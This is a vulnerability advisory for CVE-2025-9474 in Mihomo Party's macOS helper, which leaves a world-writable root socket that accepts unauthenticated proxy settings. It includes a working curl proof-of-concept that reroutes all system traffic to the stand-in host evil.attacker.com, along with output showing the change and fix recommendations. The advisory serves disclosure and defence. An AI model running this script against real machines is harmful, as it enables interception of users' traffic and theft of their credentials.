# Local privilege abuse via unprotected UNIX socket in Mihomo Party Helper on macOS

## Summary

Mihomo Party for macOS before version 1.8.1 exposes a root-owned UNIX socket (`/tmp/mihomo-party-helper.sock`) with world-readable and writable permissions. This socket accepts unauthenticated HTTP requests for setting system-wide proxy configurations. A local attacker can connect to this socket and configure the system to route all traffic through an attacker-controlled server, leading to potential man-in-the-middle (MiTM) attacks and data exfiltration.

## Technical Details

The vulnerable code resides in [src/main/sys/sysproxy.ts](https://github.com/mihomo-party-org/mihomo-party/blob/0a064bdbb8fe16c8727d3c95bd1dd3acf6043da9/src/main/sys/sysproxy.ts), specifically in the `enableSysProxy()` function:

```ts
await helperRequest(() =>
  axios.post(
    'http://localhost/global',
    { host: host || '127.0.0.1', port: port.toString(), bypass: bypass.join(',') },
    {
      socketPath: helperSocketPath // = "/tmp/mihomo-party-helper.sock"
    }
  )
)
```

There is no access control: the privileged helper blindly executes system-level network commands based on any request that reaches the UNIX socket, such as:
```json
{
  "host": "evil.attacker.com",
  "port": "1337",
  "bypass": "localhost,127.0.0.1"
}
```

The helper process runs as root and uses macOS's networksetup or equivalent system APIs to apply proxy changes system-wide.

## Proof-of-Concept

>Note: The only prerequisite is that the victim needs to enable the privileged user in order to use the functionality. (Allowing the TCC prompt):

<img width="1582" height="1210" alt="party1" src="https://github.com/user-attachments/assets/26b0db10-bfa0-498e-8b70-879fa2991e58" />

Once granted, a UNIX domain socket is created at:
```
ls -l /tmp/mihomo-party-helper.sock
```

Output:
```
srw-rw-rw-  1 root  wheel  0 Aug  5 22:48 /tmp/mihomo-party-helper.sock
```

<img width="2000" height="830" alt="party2" src="https://github.com/user-attachments/assets/f5467c21-e0f2-40a9-a927-fc10738a83b9" />

World-writable socket means any local user can interact with it.

## Proof-of-Concept

**Proof-of-Concept Script**

```sh
#!/usr/bin/env bash
  
SOCKET_PATH="/tmp/mihomo-party-helper.sock"
ATTACKER_HOST="evil.attacker.com"
ATTACKER_PORT="1337"
BYPASS="localhost,127.0.0.1"
  
# Stuur een verzoek naar de helper via curl+socket
curl --unix-socket "$SOCKET_PATH" \
  -X POST http://localhost/global \
  -H "Content-Type: application/json" \
  -d "{\"host\":\"$ATTACKER_HOST\",\"port\":\"$ATTACKER_PORT\",\"bypass\":\"$BYPASS\"}"
```

This command configures the system to send all traffic via the attacker’s proxy.

Output proof: verify that the system proxy was changed:


```sh
swayzgl1tzyyy@SwayZGl1tZyyys-Mac /tmp % networksetup -listallnetworkservices
  
An asterisk (*) denotes that a network service is disabled.
Ethernet
```

```
swayzgl1tzyyy@SwayZGl1tZyyys-Mac /tmp % networksetup -getwebproxy Ethernet
  
Enabled: Yes
Server: evil.attacker.com
Port: 1337
Authenticated Proxy Enabled: 0
```

```sh
swayzgl1tzyyy@SwayZGl1tZyyys-Mac /tmp % scutil --proxy
  
<dictionary> {
  ExceptionsList : <array> {
    0 : localhost
    1 : 127.0.0.1
  }
  FTPPassive : 1
  HTTPEnable : 1
  HTTPPort : 1337
  HTTPProxy : evil.attacker.com
  HTTPSEnable : 1
  HTTPSPort : 1337
  HTTPSProxy : evil.attacker.com
  ProxyAutoConfigEnable : 0
  ProxyAutoDiscoveryEnable : 0
  SOCKSEnable : 1
  SOCKSPort : 1337
  SOCKSProxy : evil.attacker.com
}
```

<img width="3502" height="1476" alt="xxx" src="https://github.com/user-attachments/assets/668f7ea0-233f-430c-bb3f-729bf1c4e51d" />

This proves all HTTP/HTTPS/SOCKS traffic is now being routed through an attacker-controlled endpoint.

## Impact

This vulnerability allows any local unprivileged user on the system to change system-wide proxy settings through a privileged helper, without requiring root access or user interaction.

Once exploited, an attacker can:

- Redirect all `HTTP/HTTPS/SOCKS` traffic from the victim’s system through an attacker-controlled server
- Perform man-in-the-middle (MiTM) attacks to intercept sensitive data such as authentication tokens, session cookies, or credentials
- Inject or tamper with responses, e.g., malicious software updates or script injection into web apps
- Disrupt network connectivity by pointing to invalid or unreachable proxies
- Bypass network restrictions or monitoring by rerouting traffic

Because the proxy settings affect all applications and system services, including browsers, CLI tools (e.g., curl, git), and Electron apps, the impact is wide-reaching and persistent.

This constitutes a privilege boundary violation between unprivileged users and the root-level system configuration daemon, and breaks the expected isolation guarantees on a multi-user macOS system.


## Recommendations

**Restrict socket permissions**
Ensure the helper's UNIX domain socket is not world-accessible. Use `0600` or `0700` permissions and restrict ownership to the correct user or service account.

**Move socket to a secure location**
Avoid using /tmp for security-sensitive IPC. Instead, place the socket in a secure system location such as /var/run/ or use system-managed socket activation via launchd.

**Implement authentication or request validation**
The helper should verify the identity of the client before accepting any proxy configuration requests for example by checking signing tokens.


#### References
- Similar vulnerability - ProxyMan change proxy privileged action vulnerability (CVE-2019-20057) 

More explanations:
- https://www.nccgroup.com/research-blog/technical-advisory-insufficient-proxyman-helpertool-xpc-validation/
- https://theevilbit.github.io/posts/secure_coding_xpc_part1/#proxyman-change-proxy-privileged-action-vulnerability-cve-2019-20057



References:
- https://github.com/mihomo-party-org/mihomo-party/security/advisories/GHSA-73x8-f7c7-w88h
- https://vuldb.com/?id.321343
- https://www.cve.org/CVERecord?id=CVE-2025-9474 
